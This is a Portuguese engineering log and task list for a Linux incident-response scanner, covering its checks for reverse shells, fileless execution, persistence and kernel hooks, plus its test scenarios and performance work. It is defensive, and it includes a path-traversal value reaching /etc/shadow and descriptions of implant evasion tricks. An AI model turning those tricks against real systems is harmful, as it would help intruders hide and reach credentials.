# Aletheia — implementação

Derivado de `SPEC.md` §15. Cada tarefa é uma unidade coerente e verificável.
Marcar `[x]` só quando compila, roda e tem teste onde faz sentido.

---

## Fase 1 — esqueleto  ▸ estabelece o padrão para todo o resto

- [x] **1.1** `go.mod`, layout, `Makefile`, build estático verificado (`file` diz `statically linked`)
- [x] **1.2** `internal/env` — `Cap`, `Source`, `Probe()`, `Path()` (prefixo `--root`), relógio, hash do próprio binário
- [x] **1.3** `internal/check` — `Severity`, `Origin`, `Finding`, `Result`, `Check`, registry com validação no `init`
- [x] **1.4** `internal/facts` — `Host` + `Processes`: a passada única em `/proc`, com as armadilhas de parsing da spec §9
- [x] **1.5** `internal/check/engine` — `Requires`/`Optional` → `NOT_CHECKED`/`Partial`, cobertura com denominador = conjunto selecionado
- [x] **1.6** `internal/report` — default compacto, `-v`, JSONL, rodapé de cobertura, exit code
- [x] **1.7** `cmd/aletheia` — dispatch sem framework; `scan` e `checks`
- [~] **1.8** auto-identificação: `Self` marca a ferramenta e ancestrais no coletor;
        o marcador embutido para varredura de filesystem fica para a fase 4

## Fase 2 — checks de processo  ▸ maior sinal por segundo

- [x] **2.1** `proc.exe_missing` — `/memfd:` e `(deleted)` (§3.16, §3.14)
- [x] **2.2** `proc.kthread_disguise` — cmdline vazio + argv0 `[…]` com exe existente, relendo contra corrida (§3.5)
- [x] **2.3** `proc.suspicious_path` — `/tmp`, `/dev/shm`, `~/.config/<dir>/<bin>`; `~/.local` é XDG legítimo (§8)
- [x] **2.4** `proc.caps_unexpected` — `CapEff` **comparado com o esperado**, não apenas != 0 (§3.7)
- [x] **2.5** `proc.tracer`, `proc.ns_divergent`, `proc.maps_rwx_anon` (§3.7, §3.15, §3.10)
- [x] **2.6** `correlate.revshell` — fd 0,1,2 no mesmo socket **descartando socket activation** (§17)
- [x] **2.7** `wtf` — mesma coleta, renderização e orçamento próprios

## Fase 3 — rede

- [x] **3.1** `facts/net` — `/proc/net/tcp{,6}` + mapeamento inode→pid sob orçamento
- [x] **3.2** checks §2 — saída para IP público, listener fora de loopback
- [x] **3.3** `net.pivot` — **saída** externa + **saída** interna no mesmo PID (direção é o que separa do proxy)
- [ ] **3.4** `net.systemd_listener_orphan` — listener do PID 1 **sem** `.socket` unit correspondente

## Fase 4 — persistência (§7)  ▸ maior economia de tempo manual

- [x] **4.1** `facts/systemd` — **baseado em arquivo**: units, timers, `.socket`, `.path`, `*.wants/`, drop-ins
- [~] **4.2** cron e `at` feitos, com a extração do intervalo `*/N`; anacron não tem coletor próprio
- [x] **4.3** SSH — `authorized_keys`, `sshd_config` efetivo, `AuthorizedKeysCommand`, `.ssh/rc`
- [x] **4.4** shell startup — lista exata + diff contra `/etc/skel` (contexto, não achado) + `BASH_ENV`
- [x] **4.5** loader — `ld.so.preload`, `ld.so.conf.d`, `/etc/environment`
- [x] **4.6** `rc.local`/`init.d`/generators, PAM, udev, MOTD, hooks de pacote
- [x] **4.7** CA plantada, `/etc/hosts`, resolver, git hooks, `auto_prepend_file`, metadata de nuvem
- [~] **4.8** supervisores (pm2, supervisord) — feito; containers (`docker diff`, restart policy) fica para a fase 12

## Fase 5 — IOC e janela  ▸ o que fecha a §23

- [ ] **5.1** `--ioc` — IPs, hashes, paths, strings, chaves, usuários
- [ ] **5.2** `--since` transversal, com a regra de default explícita

## Fase 6 — anti-forense e catálogo

- [x] **6.1** família `antiforense` — wtmp com salto, log zerado, `HISTFILE` off, `chattr +a`, timestomp
- [x] **6.2** `aletheia checks` — catálogo com coluna de falso positivo

## Fase 7 — integridade e privilégio

- [~] **7.1** `§24` — feito NATIVO (dpkg e apk lidos do disco, sem `origin:tool`); rpm declara a lacuna
- [x] **7.2** `§25`/`§36` — SUID, capabilities, sudoers, grupos, gravável-executado-por-root

## Fase 8 — kernel (§35)

- [~] **8.1** taint decodificado e ATRIBUÍDO (`kernel.taint_unexplained`: o achado é a marca que
        nenhum módulo carregado assume) + `/sys/module` × `/proc/modules` (`cross.module_view`);
        módulo carregado sem arquivo em disco continua de fora
- [~] **8.2** ftrace feito (`kernel.ftrace_hook`); a LISTA de kprobes registrados não é lida —
        o que se vê hoje é o kprobe com programa eBPF pendurado, pela fase 8.3
- [x] **8.3** eBPF nativo via `bpf()` — `PROG_GET_NEXT_ID`, `GET_FD_BY_ID`, `OBJ_GET_INFO_BY_FD`,
        mais `LINK_*`, `MAP_LOOKUP_ELEM` (tail call), `OBJ_GET` (pin) e `TASK_FD_QUERY` (anexo legado)

## Fase 9 — checks manuais parametrizados

- [ ] **9.1** §37 exfiltração, §10.4 nuvem, §34 hardening, §39 gestão — com âncora e instância preenchidos

## Fase 10 — `watch`

- [x] **10.1** amostragem, diff entre snapshots, delta e periodicidade, casamento com gatilho

## Fase 11 — collect / analyze / fixtures

- [ ] **11.1** `collect` + `analyze` + `schema_version`
- [ ] **11.2** redação na camada de saída (relatório, JSONL, checklist, facts)
- [ ] **11.3** fixtures por distro + suíte rodando contra todas

## Fase 12 — `preserve`

- [ ] **12.1** `cp /proc/<pid>/exe` + `stat` + sha256 do original e da cópia
- [ ] **12.2** dump de memória nativo (`/proc/<pid>/maps` + `/proc/<pid>/mem`), sem ptrace
- [ ] **12.3** `--pcap` — AF_PACKET + `x/net/bpf`, com `PACKET_STATISTICS` reportado
- [ ] **12.4** run log em `$IR/aletheia-runs.jsonl`

## Fase 13 — rotina

- [~] **13.1** `baseline` feito; o `diff` é a flag `--baseline` de `scan` e `watch`, não subcomando
- [ ] **13.2** `readiness`

---

## Invariantes — valem para toda tarefa

```
todo check declara FalsePositives            init falha sem isso
todo check declara Requires/Optional/Sources
cobertura tem denominador = conjunto selecionado
nada escreve sem --out
sem rede, sem DNS, sem executar binário do host
tempo em UTC
campo ausente vira "desconhecido", nunca zero
limite de orçamento vira NOT_CHECKED, nunca truncamento silencioso
```

---

## Registro

**Fase 1 concluída** (esqueleto) + **2.1 / 2.2** (primeiros checks).

```
suíte            7 pacotes · 78 testes · `make verify` CONFIRMA o binário estático · `make verify` CONFIRMA o binário estático, não presume
16 arquivos Go   ~3.5k linhas

achado do teste  Path() deixava ".." escapar do --root: filepath.Join("/mnt/ir",
                 "/../../etc/shadow") resolvia para "/etc/shadow" — a ferramenta leria o
                 host do ANALISTA achando que lia a imagem. Corrigido ancorando com
                 Join("/", p) antes de prefixar. Um caminho pode vir de dado do alvo

achado do run    coleta parcial entrava na aritmética de checks, e o exit saiu 0 com 247
                 processos ilegíveis. Virou eixo próprio (CollectorGaps): não mexe na
                 conta de checks, mas impede veredito de OK

validação e2e    dois cenários plantados (exec -a e binário apagado) detectados com as
                 severidades certas. Kernel thread REAL não disparou — não tem exe
```

---

## Correções da revisão de código (1ª rodada)

15 defeitos confirmados. Os cinco piores eram a **própria promessa da ferramenta
invertida** — ela dizia "não achei" onde a resposta honesta era "não olhei".

```
GRUPO A — a mentira central
[x] nenhum check declarava Optional: CapRoot     sem root, 246 de 303 exe ilegíveis e o
                                                 relatório dizia "cobertura 3/3, exit 0".
                                                 Agora: parciais 3, INCOMPLETE, exit 1
[x] Register valida o invariante                 check que lê /proc e não declara CapRoot
                                                 faz o binário NÃO SUBIR
[x] PID descartado em silêncio                   sob hidepid a ferramenta via 4 de 310 e
                                                 dizia OK. Agora vira lacuna declarada
[x] exe ilegível lido como "kthread real"        um exec -a de root passava por thread de
                                                 kernel legítima num scan não-root
[x] --only com grupo inexistente                 "--only proc,net,kernel" alegava 3/3 sem
                                                 net nem kernel existirem. Agora: exit 3
[x] CollectorGaps ausente do JSONL               humano dizia INCOMPLETE, JSONL dizia 3/3

GRUPO B — dano causado pela ferramenta
[x] --json truncava caminho arbitrário           `--json /var/log/auth.log` zerava o log.
                                                 Agora O_EXCL: nunca sobrescreve
[x] NextSteps prometia `aletheia preserve`       subcomando inexistente; o operador seguia
                                                 para matar e destruía a única cópia.
                                                 Agora emite o `cp /proc/N/exe` que funciona
[x] panic saía com status 2 = CRITICAL           defeito da ferramenta virava "host
                                                 comprometido" na automação de frota.
                                                 Agora: recover, o check vira NÃO VERIFICADO

GRUPO C — evasão pelo atacante
[x] injeção de terminal via argv                 implante que põe ESC no próprio argv
                                                 limpava a tela e forjava RESULT: OK.
                                                 O campo de evidência era o veículo
[x] teto de fds cortava 0,1,2                    ReadDir ordena por NOME: fd 2 caía no
                                                 índice 612 de 1500. Agora ordena numérico
[x] --root escapava por symlink                  symlink ABSOLUTO (normal em rootfs real)
                                                 fazia ler o host do analista. Agora os.Root
                                                 (openat2/RESOLVE_BENEATH)
[x] sleep de 20ms serial                         50 processos de usuário sem privilégio →
                                                 1,2s e 50 críticos. Agora: 2ª passada,
                                                 UM sleep, com teto

GRUPO D/E — vazamento e falso positivo fabricado
[x] cmdline com senha ia para o ticket           pacote internal/redact, aplicado antes de
                                                 o dado entrar no achado
[x] processo morto virava CRITICAL               readNUL confundia ENOENT com vazio.
                                                 Agora distingue, e confere starttime
                                                 contra reuso de PID

BÔNUS — o PID 1 era isento de tudo
[x] ancestorsOf marcava toda a cadeia como Self  e a caminhada terminava em 1, então o
                                                 PID 1 nunca era avaliado em host nenhum —
                                                 junto com o sshd ancestral da sessão de IR
```

### A lição que fica

A suíte estava **verde através de tudo isso**, e em dois pontos produzia
confiança falsa:

```
TestCatalogoSatisfazInvariantes   iterava um registry VAZIO — o pacote `check` não pode
                                  importar `checks` (ciclo), então o corpo do laço nunca
                                  executava. Movido para internal/checks, onde o registry
                                  existe, e ganhou guarda contra reintroduzir
rebaixamento de confiança         4 testes o faziam parecer coberto; em produção é código
                                  morto (chaveia IDs não registrados, e nada gera ToolOrigin)
```

Testei o código que escrevi, não os invariantes que a spec declara. Onde é
possível, o invariante virou validação no `Register` — assim ele falha no build,
não numa revisão.

### Pendente desta rodada

```
[ ] rebaixamento de confiança      só sai do papel quando existir um check com origin:tool
                                   (fase 7, dpkg -V) e o de ld.so.preload (fase 4.5)
[ ] readCgroup escolhe a hierarquia errada no v1 — destrói a proveniência que promete
[ ] readMaps divide path por espaço — nome de diretório com espaço derrota MapsOdd
[ ] env.Reason colapsa gap de múltiplas caps para a ordem de declaração
[ ] Makefile: `dist` não depende de `verify` — GOOS=windows produz PE chamado -linux-*
[ ] build agora exige Go >= 1.25 (os.Root). Runtime segue com piso kernel 2.6.32
```

---

## Ambiente de teste (fase 11.3, adiantada)

`make scenarios` — a CLI de verdade, contra `/proc` de verdade, em distribuições
de verdade. Atrás da tag `scenarios` porque exige docker: `go test ./...`
continua rápido e sem dependência externa.

```
test/scenario/    cenários como arquivos Go, um init() cada — mesmo padrão dos checks,
                  sem parser, sem dependência. O script de plantio é literal de crase
test/helper/      binário estático que monta o que shell não monta: argv0 arbitrário
                  (exec -a é builtin do bash) e execução via memfd_create
test/scenario_test.go  runner: docker run, parse do JSONL, asserção
```

**Asserção pelo mesmo contrato que a frota consome.** O runner lê o JSONL —
`id`, `sev`, `subject` e a linha de cobertura. Testar por ele garante que o que
a suíte valida é o que o operador realmente recebe.

**Estado: 14 execuções verdes, 3 puladas com motivo escrito.**

```
[x] 00-limpo                    zero achados em contêiner intocado (debian, alpine)
[x] 01-sem-root                 cobertura DEGRADA e exit != 0 — o invariante central
[x] 02-kthread-real             kthread legítima não dispara: não tem exe
[x] 10-kthread-disguise         argv0 entre colchetes com exe resolvido
[x] 11-exe-apagado              binário removido com o processo vivo → WARN, não CRITICAL
[x] 12-pid1-nao-eh-isento       regressão: PID 1 é avaliado como qualquer outro
[x] 13-memfd-fileless           execução de memória anônima
[x] 20-image-symlink-absoluto   imagem não pode ler o host do analista
[x] 21-image-sem-processo       imagem sem /proc vira NÃO VERIFICADO, não "limpo"
[~] 90-kernel-antigo            exige VM: contêiner compartilha o kernel do host
[x] 30-hidepid-root             VM: com root, hidepid não esconde — o implante é visto
[x] 31-hidepid-sem-root         VM: sem root o implante é INVISÍVEL e a ferramenta DIZ
[~] 92-userland-trojanizado     construir quando a fase 7 (integridade) existir
```

### Dois invariantes que o harness impõe

```
todo check tem cenário    TestTodoCheckTemCenario recusa check que ninguém provou
                          disparar — mesma lógica do FalsePositives obrigatório.
                          Ele JÁ pegou o proc.memfd_exec sem cenário
binário roda em scratch   `file` DIZ que é estático; rodar numa imagem sem libc,
                          sem shell e sem coreutils PROVA. É a propriedade que
                          justificou escolher Go (SPEC 4)
```

### O que a matriz revelou

```
busybox despacha por argv[0]   em Alpine, /bin/sleep É o busybox: renomeá-lo faz ele
                               procurar um applet inexistente e sair. O cenário de
                               disfarce não plantava processo nenhum, e o de exe
                               apagado também não. Só a matriz pega isso — e é por
                               isso que o helper precisa ser alvo próprio e estático
--json - interleava            o JSONL saía misturado ao relatório humano no mesmo
                               stdout, então `scan --json - > out.jsonl` gerava
                               arquivo inválido. Corrigido: com --json -, o humano
                               vai para stderr
```

### O que o contêiner NÃO cobre — e não adianta fingir que cobre

```
kernel diferente     todo contêiner usa o kernel do HOST. centos:6 testa o layout de
                     userland, não o procfs do 2.6.32 — e osrelease reporta o host
hidepid, ptrace_scope, lockdown, cgroup v1 x v2    são do kernel/mount do host
systemd de verdade   a maioria das imagens não roda systemd
eBPF, ftrace, módulos  a fase 8 inteira precisa de VM
```

### Camada VM — `Mode: VM`

Para o que contêiner não alcança. **Não** é libvirt + qcow2 + virt-manager: isso
é a forma certa para VM de desenvolvimento e errada para suíte automatizada —
traz daemon, XML, permissões e estado persistente, e uma qcow2 de distro sobe em
5–20s. Com dezenas de cenários, ninguém roda mais.

```
kernel     /boot/vmlinuz do HOST — cobre mount, sysctl, módulo, cgroup, eBPF.
           NÃO cobre o FORMATO antigo de procfs: isso exige kernel de época
guest      initramfs construído do `docker export alpine` + os dois binários
           estáticos + um /init de ~40 linhas. Sem qcow2, sem qemu-img, sem
           bootloader, sem cloud-init, sem debootstrap
entrada    cenário em base64 na linha de comando do kernel
saída      console serial (`-serial file:`). Sem rede, sem disco compartilhado,
           sem SSH — o texto que diz "não monte nada do host" só fecha se houver
           um canal, e este é ele
boot       ~0,5s. Instalar: apenas `qemu-system-x86` (19,6 MiB de download)
```

O par `30`/`31` é o coração da suíte: **mesmo implante, mesmo instante.** Com
root, `CRITICAL`, exit 2. Sem privilégio sob `hidepid=2`, o implante é
genuinamente invisível — e a asserção é dupla: o achado NÃO aparece **e** o
veredito NÃO pode ser OK. Sai `0/3 · INCOMPLETE · exit 1`.

Antes da correção da revisão, essa segunda execução imprimia `RESULT: OK`,
exit 0, com um implante CRITICAL bem ali. Agora existe teste no ambiente exato
em que o defeito se manifestava.

### Mais um defeito que o ambiente expôs

```
--json /dev/console recusado   o O_EXCL que fecha `--json /var/log/auth.log`
                               bloqueava também device e fifo, que são uso
                               legítimo. A regra passou a ser por TIPO: recusa
                               arquivo REGULAR existente; device/fifo/socket
                               abre sem criar e sem truncar
```

---

## Registro — rede (2.6, 3.1, 3.3)

`facts/net` lê `/proc/net/tcp{,6}` e junta inode→PID pelos fds que o coletor de
processo já tinha lido. Duas coisas custaram o tempo:

```
endianness    o endereço vem em hex com cada palavra de 32 bits em ordem de
              HOST. Ignorar a inversão faz 127.0.0.1 virar 1.0.0.127 — e aí
              loopback é classificado como público, e o relatório acusa "saída
              para endereço público" em todo processo local
direção       o kernel NÃO registra quem iniciou a conexão. É inferida
              comparando a porta local com a tabela de LISTEN. O parser foi
              conferido contra o `ss` do host: IPs, portas, estados e o join
              inode→PID batem
```

**A direção é o produto todo.** Sem ela os dois checks estão errados, e errados
do jeito pior — disparando no que é legítimo:

```
correlate.revshell   fd 0,1,2 no mesmo socket é também a forma EXATA da ativação
                     por socket do systemd (StandardInput=socket) e do inetd.
                     Sem a direção, dispara em sshd.socket
net.pivot            saída externa + saída interna é também a forma de todo
                     proxy reverso. Sem a direção, dispara em todo nginx
```

Por isso os cenários vêm em par: uma forma que precisa disparar e a forma
legítima quase idêntica que não pode. O positivo sozinho não prova que o check
discrimina — prova só que ele dispara.

```
40-revshell                            CRITICAL, exit 2
41-socket-activation-nao-eh-revshell   Forbid revshell — a matriz inteira
42-pivot                               WARN, exit 1
43-proxy-reverso-nao-eh-pivo           Forbid pivot
```

### Endereço público sem rede

Os cenários precisam de peer de escopo público para exercitar a classificação, e
depender de internet num teste é inaceitável. `--network=none` mais
`--cap-add=NET_ADMIN`, e o cenário cria apelidos em `lo`:

```
ip addr add 51.91.190.241/32 dev lo     público para quem classifica
ip addr add 10.0.0.9/32      dev lo     privado para quem classifica
```

Nenhum pacote sai do namespace. O contêiner não tem sequer `eth0`. Isso também
tornou desnecessário levar estes cenários para a VM — o que estava sob teste era
a classificação, não o kernel.

### Limite conhecido, registrado no código

Não há campo de direção em `/proc/net/tcp`, e não há fonte melhor sem conntrack
ou eBPF. A inferência erra em dois casos, ambos caros de provocar:

```
falso NEGATIVO   implante que amarra a porta de origem numa porta também em
                 LISTEN aparece como entrada
falso POSITIVO   serviço que fecha o listener depois do accept: a conexão
                 aceita passa a parecer saída
```

Trocar isso por faixa de porta efêmera seria pior — é chute, e quem escolhe a
porta é o implante.

---

## Registro — caminho, privilégio e memória (2.3, 2.4, 2.5)

Cinco checks novos: `proc.suspicious_path` (§8), `proc.caps_unexpected` (§3.7),
`proc.tracer` (§3.7), `proc.maps_rwx_anon` (§3.10) e `proc.ns_divergent`
(§3.15). Total: 10 checks automáticos, todos com cenário.

### O coletor engolia dois erros em silêncio

`readMaps` e `readNS` retornavam sem registrar nada quando faltava permissão —
a mesma classe de defeito que a revisão pegou em `exe` e `fd`. Um host sem root
produziria mapa de namespace vazio, e o check leria "nenhum namespace
divergente". Agora viram `MapsDenied`/`NSDenied` por processo e lacuna de coleta
declarada.

### Rodar contra host real pegou o que teste sintético não pegaria

Primeira execução, um achado: `fusermount3`, uid 1000, com o conjunto cheio de
capability. Falso positivo — `Uid: 1000 0 0 0`. O uid REAL é 1000, o EFETIVO é
0: é setuid-root, e portanto É root. O coletor só guardava o primeiro campo.

```
antes    p.UID = fs[0]                      todo setuid do sistema virava escalada
depois   p.UID = fs[0]; p.EUID = fs[1]      e o check testa o EFETIVO
```

O segundo veio do mesmo teste: processo em namespace de usuário (Podman
rootless, sandbox de navegador) exibe `CapEff` cheio, e essas capabilities não
valem nada fora do namespace. Descartadas comparando com o namespace do PID 1.

### E depois, com visão de root sobre o host inteiro

`docker run --pid=host --privileged` dá a visão que `sudo` daria. Resultado:
**36 avisos**, todos de `proc.ns_divergent`. A investigação mudou o desenho do
check:

```
25 de udevd      isUnitCgroup usava HasSuffix, e o cgroup de serviço com
                 subgrupo é /system.slice/systemd-udevd.service/udev
 3 de polkit,    systemd cria namespace de REDE e de USUÁRIO por hardening de
   upower,       unit — PrivateNetwork=, PrivateUsers=. A premissa de que só
   accounts      mnt era comum estava errada
 8 do Firefox    sandbox de navegador. É FP declarado, e só aparece em desktop
```

Passou a pular unit por inteiro, não só o namespace de mount. De 36 para 8 —
e os 8 são o FP declarado. Em servidor, zero. O preço é um ponto cego dito em
voz alta: quem comprometeu uma unit não aparece neste check (aparece nos outros).

Os outros quatro checks novos: **zero achado** contra o host real com visão de
root. É o resultado que interessa — ruído treina o operador a ignorar o
relatório inteiro.

### Cenários novos

O helper ganhou `caps`, `trace`, `rwx`, e o harness ganhou `Caps`/`NoNetwork`
no lugar do `NetAdmin`.

```
14-caminho-suspeito             binário de /tmp
15-capability-sem-root          PR_SET_KEEPCAPS através do setuid: as duas
                                capabilities usadas estão no conjunto PADRÃO do
                                Docker, então não precisa de --cap-add
16-ptrace                       filho sob PTRACE_TRACEME (satisfaz ptrace_scope=1)
17-rwx-anonimo                  mmap PROT_EXEC|PROT_WRITE anônimo
18-jit-de-sistema-nao-dispara   negativo: /usr/bin/node com a mesma forma
19-namespace-proprio            unshare -n com cgroup `/`
```

O `15` é o único `MustBeIncomplete` do bloco, e por um motivo que vale registrar:
trocar de uid zera o flag `dumpable`, e a partir daí nem o root do contêiner lê
o `exe` daquele processo sem `CAP_SYS_PTRACE`. A cobertura CAI — e a ferramenta
diz isso em vez de fingir que olhou.

---

## Registro — `wtf` (2.7)

Comando próprio, não `scan --compacto`. Mesma coleta; seleção, orçamento e
renderização separados.

```
seleção        os checks com Wtf:true. O denominador da cobertura é ELE, não o
               catálogo — senão o wtf sairia INCOMPLETE sempre e o exit code
               deixaria de significar alguma coisa
orçamento      teto de 2s, e o relógio começa ANTES da coleta: a coleta é a
               parte cara, e um orçamento que só cobrisse os checks estaria
               medindo a parte errada
prazo estourado  vira NÃO VERIFICADO, nunca "nada encontrado". Um overview que
               fica rápido calando check é pior que um overview lento
tela           crítico ganha 2 linhas de evidência e o passo irreversível;
               aviso ganha uma linha. Corte em 8, com a contagem do que sobrou
```

Contra host real: **57ms** para 10 checks.

### O rodapé é o comando

`wtf` é o que mais corre risco de ser lido como "host limpo". Sem achado, o
texto diz o contrário do que a tela sugere:

```
✓ nenhum indicador decisivo em 10 checks (57ms)
  isto NÃO significa host limpo (runbook §35.8). Para o resto: aletheia scan
```

E o `RESULT` sempre termina com `Isto NÃO é varredura: rode aletheia scan`.

### `--oneline`, para frota

```
CRITICAL   revshell(21) pivot(22) suspicious_path(32)
OK         —
INCOMPLETE —  [cobertura 4/10]
```

Sem hostname: quem varre a frota já sabe em qual host mandou rodar e prefixa a
linha. A **cobertura entra sempre que estiver degradada** — sem ela, um host
onde metade não rodou apareceria na lista igual a um host varrido inteiro, e é
justamente esse que precisa de atenção primeiro.

O `Subject` passa pelo `Safe()` também aqui, e por um motivo que só existe neste
formato: numa varredura por ssh a saída de dezenas de hosts é concatenada, e uma
sequência de escape vinda de argv forjaria a linha dos outros hosts.

### Cenário

O harness ganhou `Cmd`, e `44-wtf-revshell` roda o comando de verdade. O que ele
trava não é a renderização — é o CONTRATO: mesmo JSONL, mesmo exit code. É por
ele que a frota se ordena.

---

## Registro — ambientes legados

Pergunta que motivou: **a CLI funciona em qualquer Linux? versão antiga? VM
legada?** A resposta honesta exigia bootar kernel legado, e não dava para
responder com contêiner: contêiner compartilha o kernel do host.

### Os dois eixos, e por que são separados

```
userland    contêiner resolve. centos:7 e debian:9 na matriz `legado` —
            valor real: base de pacotes RPM, que a matriz principal não tem
kernel      só VM. `make vm-kernels` baixa 3.18 (2014) e 4.14 (o LTS do
            Amazon Linux 2 e da era do Ubuntu 18.04), verifica o sha256 e
            grava em dist/vm/kernels/. NÃO toca em /boot, não instala nada,
            não encosta no bootloader — os arquivos vão para o QEMU com -kernel
arquitetura `make arches` cross-compila 386 e arm64. O cenário 30 roda o
            binário de 32 bits contra /proc real
```

Sem `make vm-kernels`, os cenários 50–53 são **pulados dizendo o comando** —
nunca passam em silêncio.

### Resultado

```
3.18 · 4.14 · 6.12    guest limpo: 10/10 · OK · exit 0
                      com implantes: os MESMOS seis achados, exit 2
i686 3.18 e 4.14      kernel, userland e binário de 32 bits: idem, exit 2
386 sobre kernel 64   mesmos achados que o binário nativo
cgroup v1 puro        1:name=systemd:/legado.service → cgroup=/legado.service
sem /etc/os-release   cabeçalho perde o nome da distro e SEGUE
```

### i686: arquitetura é um AMBIENTE, não um binário

O cenário 30 roda o binário de 32 bits contra o kernel de 64 do host. Isso prova
o binário, não o ambiente — e servidor i686 legado tem um kernel SEM registrador
de 64 bits formatando os campos de 64 bits do `/proc`. Fechar isso exigiu as
três peças combinando:

```
emulador    qemu-system-i386 (com KVM: o host x86_64 roda guest de 32 nativo)
kernel      linux-vanilla do repositório x86 do Alpine, não do x86_64
initramfs   i386/alpine:3.20 + dist/aletheia-386 + dist/helper-386
```

`build.sh` passou a receber a arquitetura, e o `Arch` do cenário significa coisas
diferentes por modo: em contêiner troca só o binário; em VM troca o ambiente
inteiro.

O limite fica documentado no cenário `90-kernel-2.6`: descer a 2.6.32 exigiria
rootfs de época junto, e o próprio runtime do Go não sustenta mais esse kernel.

### Dois defeitos que só o ambiente legado expôs

**1. `proc.ns_divergent` disparava em thread de KERNEL.** `kdevtmpfs` tem mount
namespace próprio por design, em todo kernel. No desktop isso se perdia no meio
dos oito achados de sandbox de navegador; num guest de sete processos ficou
sozinho na tela.

A causa raiz era pior que o sintoma: meu predicado usava `CmdlineEmpty`, que o
coletor só marca em processo que TEM exe — numa thread de kernel de verdade ele
nunca fica true. E a correção expôs que o controle de fluxo dependia de comparar
`ExeErr == "sem permissão"`, uma string em PORTUGUÊS. Traduzir a mensagem
desligaria checks em silêncio, com a suíte inteira verde. Virou campo tipado:

```
ExeMissing   o kernel não associa executável nenhum ao PID: thread de
             kernel, ou zumbi
ExeDenied    existe, e nós é que não pudemos ler
```

**2. O oposto exato do defeito original.** O cenário de guest limpo falhava uma
vez em quatro com `exit 1`. Não era flake do teste — era a ferramenta contando a
verdade de um jeito que a torna inútil:

```
antes    readProcess devolvia (nil, false) para os dois casos, e ambos viravam
         lacuna de cobertura
```

Processo que TERMINOU durante a coleta não é lacuna: ele não existe mais para
ninguém, nem para um humano rodando `ps`. Num servidor ocupado isso acontece em
toda varredura — bastava um processo sair nos 60ms da coleta para o host nunca
mais reportar OK. A ferramenta passaria de mentir para gritar lobo, que é
igualmente inútil.

```
readGone     terminou     → NÃO é lacuna; a contagem fica no JSONL, porque um
                            número alto é rotatividade anormal
readDenied   existe e não → É lacuna. hidepid=1, permissão. É o que a
             pudemos ler    ferramenta existe para não calar
```

Seis rodadas seguidas dos cenários de VM depois da correção: nenhuma falha.

### Uma correção de segurança do próprio harness

O QEMU x86 acrescenta uma placa de rede em modo usuário **por padrão**. O
comentário do harness prometia "sem rede" e o guest saía com acesso à internet
pelo host. Agora roda com `-nic none`. Um cenário de resposta a incidente não
pode dar saída de rede a implante de teste nenhum.

Total: **46 cenários**, 2 pulados com motivo documentado.

---

## Registro — desempenho em servidor grande

Pergunta que motivou: **aguenta um servidor real — muitos processos, memória,
rede?** Medido, não estimado.

### O defeito: custo quadrático nos checks

`net.pivot` perguntava "quais sockets são deste processo" para CADA processo, e
`SocketsOf` varria a tabela inteira toda vez. P×S.

```
                              antes      depois
500 proc  ·   2k sockets      4,2ms      0,55ms
2k proc   ·  16k sockets      136ms      3,8ms
5k proc   ·  40k sockets      962ms      9,6ms     ← 100×
2k proc   · 100k sockets     1563ms      13,2ms    ← 118×
```

O caso de 100 mil conexões — um balanceador comum — gastava **1,5s só de laço**,
antes da coleta e mais que o orçamento inteiro do `wtf`. `facts.Index()` monta
as três buscas por chave (socket→PID, inode→socket, PID→processo) uma vez.

`TestCustoNaoEhQuadratico` trava isso com 300ms: 30× de folga sobre o bom, 3× de
margem sob o ruim.

### A coleta: onde o tempo estava

Medido contra o `/proc` real, por leitor:

```
readMaps      18,8ms   36% do tempo · 13,6MB  67% de toda a memória
readStatus     6,4ms
readFDs        5,0ms
readNS         2,8ms
readEnviron    1,8ms
readExe        0,65ms
```

`readMaps` lia o arquivo inteiro para a memória e fatiava a string toda — uma
JVM tem dezenas de milhares de linhas de maps. Passou a percorrer em FLUXO, com
o laço quente em `[]byte` e conversão para string só quando há achado. O teto de
linhas deixou de ser cosmético: passando dele, o resto do arquivo não é lido.

```
memória total da coleta   20,3MB → 8,5MB      (-58%)
```

O TEMPO de `readMaps`, porém, não se moveu: é o kernel formatando o texto na
hora da leitura, e otimização de parsing não alcança isso.

### O alívio real: leitura paralela

Cada PID é independente — arquivos diferentes, sem estado compartilhado. A
agregação continua serial, para a ordem do relatório não depender de qual worker
terminou primeiro.

O teto é **8 workers**, baixo de propósito: este binário roda em host sob
incidente, possivelmente já sobrecarregado, e um scanner que satura a CPU
atrapalha exatamente quem está respondendo. Em VM de 1 vCPU o resultado é
serial, como antes.

```
coleta no host (316 proc)    52ms → 13,5ms
1000 processos              200ms → 50ms
3000 processos              510ms → 150ms
```

`go test -race` limpo.

### Números finais, em contêiner

```
2017 proc ·  12.001 sockets    scan 130ms · wtf 130ms
8036 proc ·  48.012 sockets    scan 420ms · wtf 410ms
```

Um servidor de 8 mil processos e 48 mil conexões é varrido em **0,42s** — cinco
vezes dentro do orçamento do `wtf`.

### Memória

```
754 KiB retidos para 316 processos  =  2,4 KB por processo
```

10 mil processos ≈ 24 MB retidos. Cabe em VM pequena junto com o que já roda
nela — que é o requisito real, já que a ferramenta chega num host em incidente.

### Cota de cgroup: o que o runtime do Go não enxerga

`runtime.NumCPU()` respeita AFINIDADE — taskset e cpuset já entram na conta. O
que ele não vê é a cota do CFS: `docker run --cpus=0.5`, limite de CPU de pod,
`CPUQuota=` de unit. Num contêiner de meia CPU ele reporta as 12 do host, e a
coleta abriria oito leitores onde cabe um — entregando mais trabalho ao
throttling num host já sob incidente.

`env.probeCPUQuota` lê os dois formatos e SOBE a hierarquia pegando o menor,
porque cota é herdada e um pai mais apertado manda no filho:

```
v2   /sys/fs/cgroup<path>/cpu.max          "50000 100000" · "max 100000" = sem limite
v1   .../cpu.cfs_quota_us + cpu.cfs_period_us   cota -1 = sem limite
```

Dentro de contêiner o namespace de cgroup faz o caminho virar `/`, e a
caminhada termina no primeiro passo — que é exatamente o limite do contêiner.

`Workers()` arredonda a cota para CIMA: com 0,5 CPU o certo é um leitor, não
zero. Errar para mais entrega trabalho ao throttling; errar para menos só deixa
a varredura mais lenta.

```
--cpus=0.5   1 worker    2000 processos em 1,27s
--cpus=2     2 workers   2000 processos em 0,14s
--cpus=12    8 (teto)    2000 processos em 0,07s
```

A cota entra no cabeçalho como CONTEXTO, não como limiar de aviso: o load vem
de `/proc/loadavg`, que não é isolado por namespace — dentro de contêiner ele
descreve o HOST, enquanto a cota descreve a fatia deste alvo. Misturar os dois
num aviso seria comparar coisas diferentes. Exibi-la também é o que torna a
detecção OBSERVÁVEL, e por isso testável: o cenário `32-cota-de-cpu` roda com
`--cpus=0.5` e exige `cota 0.5` no relatório.

